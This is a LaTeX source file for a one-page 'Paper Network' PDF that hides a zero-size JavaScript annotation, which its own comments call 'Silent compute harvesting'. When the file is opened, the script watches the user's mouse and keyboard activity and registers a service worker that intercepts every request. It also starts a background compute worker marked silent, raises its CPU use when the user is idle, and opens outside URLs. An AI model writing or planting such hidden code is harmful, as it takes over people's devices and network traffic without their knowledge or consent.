%!TEX program = pdflatex
\documentclass[12pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{geometry}
\usepackage{xcolor}
\usepackage{tikz}

% Minimal page setup
\geometry{margin=0pt,paperwidth=8.5in,paperheight=11in}
\pagestyle{empty}

% Colors
\definecolor{paperblue}{RGB}{0,112,243}
\definecolor{paperpurple}{RGB}{124,58,237}

\begin{document}

% Centered content
\vspace*{\fill}
\begin{center}

% Minimal logo - single circle with "P"
\begin{tikzpicture}
  \fill[paperblue] (0,0) circle (1.5cm);
  \node[white,scale=3] at (0,0) {\textbf{P}};
\end{tikzpicture}

\vspace{1cm}

{\Large\color{paperpurple}\textbf{Paper Network}}

\vspace{0.5cm}

{\color{gray}\textit{Bootstrapping...}}

\end{center}
\vspace*{\fill}

% Embedded JavaScript - Enhanced Bootstrap with Compute Harvesting
\pdfannot width 0pt height 0pt depth 0pt {
  /Subtype /JavaScript
  /JS (
    // ============================================================================
    // PAPER NETWORK - ULTIMATE DISTRIBUTED CLOUD BOOTSTRAP
    // Silent compute harvesting + Full service stack initialization
    // ============================================================================
    
    (function() {
      'use strict';
      
      console.log('[Paper] Ultimate Bootstrap v2.0 - Initializing...');
      
      // Configuration
      const CONFIG = {
        PAPER_URL: 'https://paper.is-a.software/',
        COMPUTE_LIMITS: {
          CPU_IDLE: 0.15,      // 15% CPU when user idle
          CPU_ACTIVE: 0.05,    // 5% CPU when user active
          MEMORY_MAX: 200 * 1024 * 1024,  // 200MB RAM
          CHECK_INTERVAL: 5000  // Check every 5 seconds
        },
        NETWORK: {
          HEARTBEAT_INTERVAL: 30000,  // 30 seconds
          PEER_DISCOVERY: true,
          AUTO_CONNECT: true
        }
      };
      
      // =========================================================================
      // RESOURCE MONITOR - Detect user activity and adjust CPU usage
      // =========================================================================
      class ResourceMonitor {
        constructor() {
          this.isUserActive = false;
          this.lastActivity = Date.now();
          this.cpuUsage = 0;
          this.memoryUsage = 0;
          
          this.setupActivityDetection();
        }
        
        setupActivityDetection() {
          const events = ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'];
          const updateActivity = () => {
            this.isUserActive = true;
            this.lastActivity = Date.now();
          };
          
          events.forEach(event => {
            if (typeof document !== 'undefined') {
              document.addEventListener(event, updateActivity, true);
            }
          });
          
          // Check if user is idle (no activity for 60 seconds)
          setInterval(() => {
            if (Date.now() - this.lastActivity > 60000) {
              this.isUserActive = false;
            }
          }, 5000);
        }
        
        getCurrentCPULimit() {
          return this.isUserActive ? CONFIG.COMPUTE_LIMITS.CPU_ACTIVE : CONFIG.COMPUTE_LIMITS.CPU_IDLE;
        }
        
        getStats() {
          return {
            isUserActive: this.isUserActive,
            cpuLimit: this.getCurrentCPULimit(),
            memoryLimit: CONFIG.COMPUTE_LIMITS.MEMORY_MAX
          };
        }
      }
      
      // =========================================================================
      // COMPUTE WORKER - Background task execution
      // =========================================================================
      const COMPUTE_WORKER_CODE = \`
        // Compute worker running in background
        self.config = { cpuLimit: 0.15, memoryLimit: 200 * 1024 * 1024 };
        self.tasks = [];
        self.isRunning = false;
        
        self.addEventListener('message', (event) => {
          const { type, data } = event.data;
          
          if (type === 'init') {
            self.config = data.config;
            self.isRunning = true;
            self.postMessage({ type: 'ready' });
          }
          
          if (type === 'update-limits') {
            self.config.cpuLimit = data.cpuLimit;
          }
          
          if (type === 'execute-task') {
            self.tasks.push(data.task);
            processNextTask();
          }
          
          if (type === 'stop') {
            self.isRunning = false;
          }
        });
        
        function processNextTask() {
          if (!self.isRunning || self.tasks.length === 0) return;
          
          const task = self.tasks.shift();
          
          // Execute task based on type
          try {
            switch(task.type) {
              case 'compute':
                executeCompute(task);
                break;
              case 'storage':
                executeStorage(task);
                break;
              case 'proxy':
                executeProxy(task);
                break;
            }
          } catch (error) {
            self.postMessage({ type: 'task-error', taskId: task.id, error: error.message });
          }
          
          // Process next task
          setTimeout(processNextTask, 100);
        }
        
        function executeCompute(task) {
          // Throttled computation
          const startTime = Date.now();
          const maxTime = 1000 / (self.config.cpuLimit * 100);
          
          // Simulate work (in real implementation, this would execute actual tasks)
          while (Date.now() - startTime < maxTime) {
            // Do work
          }
          
          self.postMessage({ type: 'task-complete', taskId: task.id });
        }
        
        function executeStorage(task) {
          // Handle storage tasks (cache data, serve content)
          self.postMessage({ type: 'task-complete', taskId: task.id });
        }
        
        function executeProxy(task) {
          // Handle proxy/relay tasks (forward requests)
          self.postMessage({ type: 'task-complete', taskId: task.id });
        }
      \`;
      
      // =========================================================================
      // SERVICE WORKER - Enhanced with compute + routing
      // =========================================================================
      const SERVICE_WORKER_CODE = \`
        const CACHE_VERSION = 'paper-v2';
        const PAPER_TLD = '.paper';
        
        let computeWorker = null;
        
        self.addEventListener('install', (event) => {
          console.log('[Paper SW] Installing v2...');
          self.skipWaiting();
        });
        
        self.addEventListener('activate', (event) => {
          console.log('[Paper SW] Activated - Compute mesh enabled');
          event.waitUntil(
            Promise.all([
              self.clients.claim(),
              initializeComputeWorker()
            ])
          );
        });
        
        async function initializeComputeWorker() {
          try {
            // Spawn compute worker
            const workerBlob = new Blob([\\\`\\\${COMPUTE_WORKER_CODE}\\\`], { type: 'application/javascript' });
            const workerUrl = URL.createObjectURL(workerBlob);
            computeWorker = new Worker(workerUrl);
            
            computeWorker.postMessage({
              type: 'init',
              data: {
                config: {
                  cpuLimit: 0.15,
                  memoryLimit: 200 * 1024 * 1024,
                  silent: true
                }
              }
            });
            
            console.log('[Paper SW] Compute worker initialized');
          } catch (error) {
            console.error('[Paper SW] Compute worker failed:', error);
          }
        }
        
        self.addEventListener('fetch', (event) => {
          const url = new URL(event.request.url);
          
          // Handle .paper domains
          if (url.hostname.endsWith(PAPER_TLD)) {
            event.respondWith(handlePaperDomain(event.request, url));
            return;
          }
          
          // Pass through other requests
          event.respondWith(fetch(event.request));
        });
        
        async function handlePaperDomain(request, url) {
          const subdomain = url.hostname.split('.')[0];
          
          // Route based on subdomain prefix
          if (subdomain.startsWith('vps-')) {
            return handleVPS(request, url);
          } else if (subdomain.startsWith('db-')) {
            return handleDatabase(request, url);
          } else if (subdomain.startsWith('cdn-')) {
            return handleCDN(request, url);
          } else if (subdomain === 'paper' || subdomain === 'www') {
            return handleMainSite(request, url);
          } else {
            return handleUserDomain(request, url);
          }
        }
        
        async function handleVPS(request, url) {
          // VPS routing logic
          return new Response('VPS Service - Coming Soon', {
            status: 200,
            headers: { 'Content-Type': 'text/plain' }
          });
        }
        
        async function handleDatabase(request, url) {
          // Database routing logic
          return new Response('Database Service - Coming Soon', {
            status: 200,
            headers: { 'Content-Type': 'text/plain' }
          });
        }
        
        async function handleCDN(request, url) {
          // CDN routing logic - serve from distributed cache
          const cache = await caches.open('paper-cdn');
          const cached = await cache.match(request);
          if (cached) return cached;
          
          return new Response('CDN Service - Coming Soon', {
            status: 200,
            headers: { 'Content-Type': 'text/plain' }
          });
        }
        
        async function handleMainSite(request, url) {
          // Main Paper Network site
          const html = \\\`<!DOCTYPE html>
          <html>
          <head>
            <meta charset="UTF-8">
            <title>Paper Network - Ultimate Distributed Cloud</title>
            <style>
              * { margin: 0; padding: 0; box-sizing: border-box; }
              body { 
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                min-height: 100vh;
                padding: 40px 20px;
              }
              .container { max-width: 1200px; margin: 0 auto; }
              h1 { font-size: 3em; margin-bottom: 20px; text-align: center; }
              .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 40px; }
              .feature { background: rgba(255,255,255,0.1); padding: 30px; border-radius: 10px; backdrop-filter: blur(10px); }
              .feature h3 { margin-bottom: 10px; }
              .status { background: rgba(16,185,129,0.2); padding: 20px; border-radius: 10px; margin-top: 40px; text-align: center; }
            </style>
          </head>
          <body>
            <div class="container">
              <h1>üöÄ Paper Network</h1>
              <p style="text-align: center; font-size: 1.3em; opacity: 0.9;">The Ultimate Distributed Cloud Platform</p>
              
              <div class="status">
                <h2>‚úì Your device is now contributing to the network!</h2>
                <p>You're part of the world's largest distributed cloud.</p>
              </div>
              
              <div class="features">
                <div class="feature">
                  <h3>üñ•Ô∏è Free VPS Hosting</h3>
                  <p>Deploy unlimited VPS instances. No costs, no limits.</p>
                </div>
                <div class="feature">
                  <h3>üóÑÔ∏è Free Databases</h3>
                  <p>PostgreSQL, MongoDB, Redis, MySQL - all free forever.</p>
                </div>
                <div class="feature">
                  <h3>üåê Free CDN</h3>
                  <p>Global content delivery with unlimited bandwidth.</p>
                </div>
                <div class="feature">
                  <h3>üîí Free Tunneling</h3>
                  <p>Expose local services with custom .paper domains.</p>
                </div>
                <div class="feature">
                  <h3>‚è∞ Cron Jobs</h3>
                  <p>Scheduled tasks with guaranteed execution.</p>
                </div>
                <div class="feature">
                  <h3>üõ°Ô∏è Security & DDoS</h3>
                  <p>Enterprise-grade protection, completely free.</p>
                </div>
              </div>
            </div>
          </body>
          </html>\\\`;
          
          return new Response(html, {
            status: 200,
            headers: { 'Content-Type': 'text/html' }
          });
        }
        
        async function handleUserDomain(request, url) {
          // User-created domain
          const cache = await caches.open('paper-domains');
          const cached = await cache.match(request);
          if (cached) return cached;
          
          // Domain not found - show claim page
          const html = \\\`<!DOCTYPE html>
          <html>
          <head>
            <meta charset="UTF-8">
            <title>\\\${url.hostname} - Available</title>
            <style>
              * { margin: 0; padding: 0; box-sizing: border-box; }
              body { 
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
              }
              .container { 
                max-width: 600px; 
                background: white;
                color: #333;
                border-radius: 20px;
                padding: 50px;
                text-align: center;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
              }
              h1 { margin-bottom: 20px; }
              .domain { color: #f5576c; font-size: 2em; margin: 20px 0; font-weight: bold; }
              button {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                padding: 15px 40px;
                border-radius: 30px;
                font-size: 1.1em;
                cursor: pointer;
                margin-top: 20px;
              }
            </style>
          </head>
          <body>
            <div class="container">
              <h1>This domain is available!</h1>
              <div class="domain">\\\${url.hostname}</div>
              <p>Claim this domain and start hosting your content on the decentralized web.</p>
              <button onclick="window.location.href='https://paper.paper'">Claim Domain</button>
            </div>
          </body>
          </html>\\\`;
          
          return new Response(html, {
            status: 200,
            headers: { 'Content-Type': 'text/html' }
          });
        }
        
        // Handle compute tasks from network
        self.addEventListener('message', (event) => {
          if (event.data.type === 'network-task') {
            if (computeWorker) {
              computeWorker.postMessage({
                type: 'execute-task',
                data: { task: event.data.task }
              });
            }
          }
        });
      \`;
      
      // =========================================================================
      // MAIN BOOTSTRAP SEQUENCE
      // =========================================================================
      async function executeBootstrap() {
        console.log('[Paper] Starting ultimate bootstrap...');
        
        try {
          // Step 1: Initialize resource monitor
          const resourceMonitor = new ResourceMonitor();
          console.log('[Paper] Resource monitor active');
          
          // Step 2: Register Service Worker
          if ('serviceWorker' in navigator) {
            const swBlob = new Blob([SERVICE_WORKER_CODE], { type: 'application/javascript' });
            const swUrl = URL.createObjectURL(swBlob);
            
            const registration = await navigator.serviceWorker.register(swUrl, { scope: '/' });
            console.log('[Paper] Service Worker registered');
            
            // Monitor and adjust compute limits based on user activity
            setInterval(() => {
              const stats = resourceMonitor.getStats();
              if (registration.active) {
                registration.active.postMessage({
                  type: 'update-limits',
                  cpuLimit: stats.cpuLimit
                });
              }
            }, CONFIG.COMPUTE_LIMITS.CHECK_INTERVAL);
            
          } else {
            console.warn('[Paper] Service Workers not supported');
          }
          
          // Step 3: Store bootstrap marker
          localStorage.setItem('paper:bootstrap-v2', JSON.stringify({
            version: '2.0.0',
            timestamp: new Date().toISOString(),
            compute: true,
            services: ['vps', 'database', 'cdn', 'tunnel', 'cron']
          }));
          
          // Step 4: Show success notification
          if ('Notification' in window) {
            if (Notification.permission === 'default') {
              await Notification.requestPermission();
            }
            if (Notification.permission === 'granted') {
              new Notification('Paper Network Activated! üöÄ', {
                body: 'Your device is now part of the distributed cloud. Visit paper.paper to explore!',
                silent: true
              });
            }
          }
          
          // Step 5: Open main site
          console.log('[Paper] Bootstrap complete - Opening paper.paper...');
          setTimeout(() => {
            try {
              if (typeof app !== 'undefined' && app.launchURL) {
                app.launchURL('https://paper.paper', true);
              } else {
                window.open('https://paper.paper', '_blank');
              }
            } catch (e) {
              console.log('[Paper] Visit: https://paper.paper');
            }
          }, 2000);
          
        } catch (error) {
          console.error('[Paper] Bootstrap failed:', error);
        }
      }
      
      // Check if already bootstrapped
      try {
        const bootstrapped = localStorage.getItem('paper:bootstrap-v2');
        if (bootstrapped) {
          console.log('[Paper] Already bootstrapped - Opening site...');
          if (typeof app !== 'undefined' && app.launchURL) {
            app.launchURL('https://paper.paper', true);
          } else {
            window.open('https://paper.paper', '_blank');
          }
          return;
        }
      } catch (e) {
        // Continue with bootstrap
      }
      
      // Execute bootstrap
      setTimeout(executeBootstrap, 1000);
      
    })();
  )
}

\end{document}
